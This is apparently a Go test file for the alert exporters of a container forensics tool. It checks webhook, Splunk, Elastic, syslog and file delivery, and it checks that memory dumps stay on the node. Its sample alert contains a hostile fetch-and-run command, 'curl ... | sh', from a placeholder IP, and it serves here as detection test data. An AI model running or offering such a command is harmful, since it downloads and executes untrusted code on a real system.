package export

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

func sampleNotification() Notification {
	return Notification{
		CaseID:         "6f1c2b3a-4d5e-4f60-9a8b-7c6d5e4f3a2b",
		Timestamp:      time.Date(2026, 3, 14, 9, 15, 0, 0, time.UTC),
		Rule:           "curl_pipe_sh",
		Severity:       "critical",
		MITRE:          "T1059.004",
		Comm:           "sh",
		Cmdline:        "/bin/sh -c curl -s http://198.51.100.9/p.sh | sh",
		Args:           []string{"/bin/sh", "-c", "curl -s http://198.51.100.9/p.sh | sh"},
		HostPID:        48291,
		NamespacePID:   1,
		UID:            0,
		ContainerID:    "3f2b1c0d9e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c",
		PodName:        "victim-app-7d9f8b6c5-x2kqp",
		PodNamespace:   "victim",
		NodeName:       "worker-3",
		Runtime:        "containerd",
		LatencyMS:      342.5,
		DumpSizeBytes:  4194304,
		DumpSHA256:     "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
		RegionCount:    12,
		CaptureStatus:  "complete",
		MerkleRoot:     "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
		SignerKeyID:    "fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9",
		EvidenceURI:    "file:///var/lib/flight-recorder/evidence/6f1c2b3a",
		Classification: "CONFIDENTIAL",
		ToolName:       "flight-recorder",
		ToolVersion:    "0.1.0",
		KernelVersion:  "6.8.0-31-generic",
	}
}

// A memory dump must never leave the node through an export channel. This is
// the single most important property in this package.
func TestExportersNeverCarryPayload(t *testing.T) {
	n := sampleNotification()
	raw, err := n.JSON()
	if err != nil {
		t.Fatalf("JSON: %v", err)
	}

	// The notification structure has no field capable of holding the dump.
	var generic map[string]any
	if err := json.Unmarshal(raw, &generic); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	for _, forbidden := range []string{"dump", "payload", "memory", "content", "data"} {
		if _, present := generic[forbidden]; present {
			t.Errorf("notification carries a %q field; evidence content must stay on the node", forbidden)
		}
	}
	if !strings.Contains(string(raw), "evidence_uri") {
		t.Error("notification does not reference the evidence by URI")
	}
}

func TestWebhookDelivers(t *testing.T) {
	var got atomic.Value
	var calls atomic.Int32

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls.Add(1)
		if r.Header.Get("X-Token") != "secret" {
			t.Errorf("custom header missing: %v", r.Header)
		}
		if r.Header.Get("Content-Type") != "application/json" {
			t.Errorf("content type = %q", r.Header.Get("Content-Type"))
		}
		var n Notification
		if err := json.NewDecoder(r.Body).Decode(&n); err != nil {
			t.Errorf("decode body: %v", err)
		}
		got.Store(n)
		w.WriteHeader(http.StatusAccepted)
	}))
	defer srv.Close()

	hook, err := NewWebhook(WebhookConfig{URL: srv.URL, Headers: map[string]string{"X-Token": "secret"}})
	if err != nil {
		t.Fatalf("NewWebhook: %v", err)
	}
	defer hook.Close()

	if err := hook.Send(context.Background(), sampleNotification()); err != nil {
		t.Fatalf("Send: %v", err)
	}

	if calls.Load() != 1 {
		t.Errorf("webhook called %d times, want 1", calls.Load())
	}
	received, _ := got.Load().(Notification)
	if received.CaseID != sampleNotification().CaseID || received.MerkleRoot == "" {
		t.Errorf("payload lost fields in transit: %+v", received)
	}
}

func TestWebhookRetriesServerErrors(t *testing.T) {
	var calls atomic.Int32

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if calls.Add(1) < 3 {
			w.WriteHeader(http.StatusBadGateway)
			return
		}
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	policy := retryPolicy{MaxAttempts: 3, BaseDelay: time.Millisecond, MaxDelay: 5 * time.Millisecond}
	hook, err := NewWebhook(WebhookConfig{URL: srv.URL, Retry: &policy})
	if err != nil {
		t.Fatalf("NewWebhook: %v", err)
	}
	defer hook.Close()

	if err := hook.Send(context.Background(), sampleNotification()); err != nil {
		t.Fatalf("Send: %v", err)
	}
	if calls.Load() != 3 {
		t.Errorf("made %d attempts, want 3", calls.Load())
	}
}

func TestWebhookDoesNotRetryClientErrors(t *testing.T) {
	var calls atomic.Int32

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls.Add(1)
		http.Error(w, "malformed", http.StatusBadRequest)
	}))
	defer srv.Close()

	policy := retryPolicy{MaxAttempts: 3, BaseDelay: time.Millisecond, MaxDelay: 5 * time.Millisecond}
	hook, err := NewWebhook(WebhookConfig{URL: srv.URL, Retry: &policy})
	if err != nil {
		t.Fatalf("NewWebhook: %v", err)
	}
	defer hook.Close()

	if err := hook.Send(context.Background(), sampleNotification()); err == nil {
		t.Fatal("a 400 response was reported as success")
	}
	if calls.Load() != 1 {
		t.Errorf("made %d attempts; a 400 will never succeed on retry", calls.Load())
	}
}

func TestWebhookRespectsContextCancellation(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(2 * time.Second)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	hook, err := NewWebhook(WebhookConfig{URL: srv.URL, Timeout: 5 * time.Second})
	if err != nil {
		t.Fatalf("NewWebhook: %v", err)
	}
	defer hook.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()

	start := time.Now()
	if err := hook.Send(ctx, sampleNotification()); err == nil {
		t.Fatal("expected a timeout error")
	}
	if elapsed := time.Since(start); elapsed > time.Second {
		t.Errorf("send took %s; the context deadline was not honoured", elapsed)
	}
}

func TestSplunkHEC(t *testing.T) {
	var body atomic.Value

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if auth := r.Header.Get("Authorization"); auth != "Splunk test-token" {
			t.Errorf("authorization = %q", auth)
		}
		var envelope map[string]any
		if err := json.NewDecoder(r.Body).Decode(&envelope); err != nil {
			t.Errorf("decode: %v", err)
		}
		body.Store(envelope)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	splunk, err := NewSplunk(SplunkConfig{URL: srv.URL, Token: "test-token", Index: "forensics"})
	if err != nil {
		t.Fatalf("NewSplunk: %v", err)
	}
	defer splunk.Close()

	if err := splunk.Send(context.Background(), sampleNotification()); err != nil {
		t.Fatalf("Send: %v", err)
	}

	envelope, _ := body.Load().(map[string]any)
	if envelope["sourcetype"] != "flight_recorder" || envelope["index"] != "forensics" {
		t.Errorf("HEC envelope = %+v", envelope)
	}

	event, ok := envelope["event"].(map[string]any)
	if !ok {
		t.Fatal("HEC envelope has no event object")
	}
	// CIM field names, so existing Splunk dashboards work without extraction.
	for _, field := range []string{"process", "process_name", "process_id", "dest", "file_hash", "signature"} {
		if _, present := event[field]; !present {
			t.Errorf("event is missing CIM field %q", field)
		}
	}
	if event["merkle_root"] != sampleNotification().MerkleRoot {
		t.Error("merkle root did not survive into the Splunk event")
	}
}

func TestSplunkRequiresToken(t *testing.T) {
	if _, err := NewSplunk(SplunkConfig{URL: "https://splunk:8088"}); err == nil {
		t.Error("a Splunk exporter was created without a HEC token")
	}
	if _, err := NewSplunk(SplunkConfig{Token: "x"}); err == nil {
		t.Error("a Splunk exporter was created without a URL")
	}
}

func TestElasticECSDocument(t *testing.T) {
	var doc atomic.Value

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !strings.HasSuffix(r.URL.Path, "/_doc") {
			t.Errorf("path = %q, want the _doc endpoint", r.URL.Path)
		}
		if r.Header.Get("Authorization") != "ApiKey abc123" {
			t.Errorf("authorization = %q", r.Header.Get("Authorization"))
		}
		var d map[string]any
		if err := json.NewDecoder(r.Body).Decode(&d); err != nil {
			t.Errorf("decode: %v", err)
		}
		doc.Store(d)
		w.WriteHeader(http.StatusCreated)
	}))
	defer srv.Close()

	elastic, err := NewElastic(ElasticConfig{URL: srv.URL, Index: "fr-test", APIKey: "abc123"})
	if err != nil {
		t.Fatalf("NewElastic: %v", err)
	}
	defer elastic.Close()

	if err := elastic.Send(context.Background(), sampleNotification()); err != nil {
		t.Fatalf("Send: %v", err)
	}

	d, _ := doc.Load().(map[string]any)
	if d["@timestamp"] == nil {
		t.Error("ECS document has no @timestamp")
	}

	event, _ := d["event"].(map[string]any)
	if event["kind"] != "alert" || event["outcome"] != "success" {
		t.Errorf("event fields = %+v", event)
	}

	process, _ := d["process"].(map[string]any)
	if process["name"] != "sh" {
		t.Errorf("process.name = %v", process["name"])
	}

	container, _ := d["container"].(map[string]any)
	if container == nil || container["id"] == "" {
		t.Error("container fields are missing")
	}

	orchestrator, _ := d["orchestrator"].(map[string]any)
	if orchestrator == nil || orchestrator["namespace"] != "victim" {
		t.Error("orchestrator fields are missing")
	}

	fr, _ := d["flight_recorder"].(map[string]any)
	if fr == nil || fr["merkle_root"] == "" {
		t.Error("vendor extension fields are missing")
	}
}

func TestSyslogRFC5424(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer listener.Close()

	lines := make(chan string, 1)
	go func() {
		conn, err := listener.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		line, _ := bufio.NewReader(conn).ReadString('\n')
		lines <- line
	}()

	sl, err := NewSyslog(SyslogConfig{Address: listener.Addr().String(), Network: "tcp", Format: SyslogRFC5424, Hostname: "worker-3"})
	if err != nil {
		t.Fatalf("NewSyslog: %v", err)
	}
	defer sl.Close()

	if err := sl.Send(context.Background(), sampleNotification()); err != nil {
		t.Fatalf("Send: %v", err)
	}

	select {
	case line := <-lines:
		if !strings.HasPrefix(line, "<") {
			t.Errorf("message has no priority field: %q", line)
		}
		if !strings.Contains(line, ">1 ") {
			t.Errorf("message is not RFC 5424 version 1: %q", line)
		}
		if !strings.Contains(line, `[flightRecorder@52913`) {
			t.Errorf("structured data element missing: %q", line)
		}
		for _, want := range []string{"caseId=", "merkleRoot=", "rule=", "severity=", "pod="} {
			if !strings.Contains(line, want) {
				t.Errorf("structured data is missing %s: %q", want, line)
			}
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for the syslog message")
	}
}

func TestSyslogCEF(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer listener.Close()

	lines := make(chan string, 1)
	go func() {
		conn, err := listener.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		line, _ := bufio.NewReader(conn).ReadString('\n')
		lines <- line
	}()

	sl, err := NewSyslog(SyslogConfig{Address: listener.Addr().String(), Network: "tcp", Format: SyslogCEF})
	if err != nil {
		t.Fatalf("NewSyslog: %v", err)
	}
	defer sl.Close()

	if err := sl.Send(context.Background(), sampleNotification()); err != nil {
		t.Fatalf("Send: %v", err)
	}

	select {
	case line := <-lines:
		if !strings.Contains(line, "CEF:0|FlightRecorder|FlightRecorder|") {
			t.Errorf("not a CEF message: %q", line)
		}
		for _, want := range []string{"cs1Label=CaseID", "cs2Label=MerkleRoot", "fileHash=", "dproc="} {
			if !strings.Contains(line, want) {
				t.Errorf("CEF extension is missing %s: %q", want, line)
			}
		}
		// The pipe in the command line must be escaped, or it would break the
		// CEF header parser.
		if strings.Contains(line, "p.sh | sh") {
			t.Errorf("unescaped pipe in the CEF extension: %q", line)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for the CEF message")
	}
}

func TestSyslogRejectsBadNetwork(t *testing.T) {
	if _, err := NewSyslog(SyslogConfig{Address: "host:514", Network: "carrier-pigeon"}); err == nil {
		t.Error("an unsupported transport was accepted")
	}
	if _, err := NewSyslog(SyslogConfig{Network: "udp"}); err == nil {
		t.Error("a syslog exporter was created with no address")
	}
}

func TestFileExporter(t *testing.T) {
	path := filepath.Join(t.TempDir(), "notifications.jsonl")

	exp, err := NewFileExporter(path)
	if err != nil {
		t.Fatalf("NewFileExporter: %v", err)
	}

	for i := 0; i < 3; i++ {
		n := sampleNotification()
		n.CaseID = fmt.Sprintf("case-%d", i)
		if err := exp.Send(context.Background(), n); err != nil {
			t.Fatalf("Send: %v", err)
		}
	}
	if err := exp.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}

	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
	if len(lines) != 3 {
		t.Fatalf("wrote %d lines, want 3", len(lines))
	}
	for i, line := range lines {
		var n Notification
		if err := json.Unmarshal([]byte(line), &n); err != nil {
			t.Errorf("line %d is not valid JSON: %v", i, err)
		}
	}
}

func TestMultiFanOutCollectsAllResults(t *testing.T) {
	good := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer good.Close()

	bad := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "nope", http.StatusBadRequest)
	}))
	defer bad.Close()

	okHook, err := NewWebhook(WebhookConfig{URL: good.URL})
	if err != nil {
		t.Fatalf("NewWebhook: %v", err)
	}
	failHook, err := NewWebhook(WebhookConfig{URL: bad.URL})
	if err != nil {
		t.Fatalf("NewWebhook: %v", err)
	}

	filePath := filepath.Join(t.TempDir(), "n.jsonl")
	fileExp, err := NewFileExporter(filePath)
	if err != nil {
		t.Fatalf("NewFileExporter: %v", err)
	}

	multi := NewMulti(okHook, failHook, fileExp)
	defer multi.Close()

	var observed atomic.Int32
	multi.OnResult = func(Result) { observed.Add(1) }

	results := multi.Send(context.Background(), sampleNotification())
	if len(results) != 3 {
		t.Fatalf("got %d results, want 3", len(results))
	}
	if observed.Load() != 3 {
		t.Errorf("OnResult fired %d times, want 3", observed.Load())
	}

	failures := 0
	for _, r := range results {
		if r.Err != nil {
			failures++
		}
	}
	if failures != 1 {
		t.Errorf("%d failures, want exactly 1 (the 400 endpoint)", failures)
	}

	// A failing exporter must not stop the others from delivering.
	raw, err := os.ReadFile(filePath)
	if err != nil || len(raw) == 0 {
		t.Error("the file exporter did not deliver despite another target failing")
	}
}

func TestMultiWithNoExporters(t *testing.T) {
	multi := NewMulti()
	if results := multi.Send(context.Background(), sampleNotification()); results != nil {
		t.Errorf("Send with no exporters returned %v", results)
	}
	if err := multi.Close(); err != nil {
		t.Errorf("Close: %v", err)
	}
}

func TestNotificationSummary(t *testing.T) {
	s := sampleNotification().Summary()
	for _, want := range []string{"rule=curl_pipe_sh", "severity=critical", "victim/victim-app", "pid=48291"} {
		if !strings.Contains(s, want) {
			t.Errorf("summary %q is missing %q", s, want)
		}
	}
}

func TestECSSeverityMapping(t *testing.T) {
	if ecsSeverity("critical") <= ecsSeverity("high") || ecsSeverity("high") <= ecsSeverity("medium") {
		t.Error("ECS severity mapping is not monotonic")
	}
	if ecsOutcome("failed") != "failure" || ecsOutcome("complete") != "success" {
		t.Error("ECS outcome mapping is wrong")
	}
}
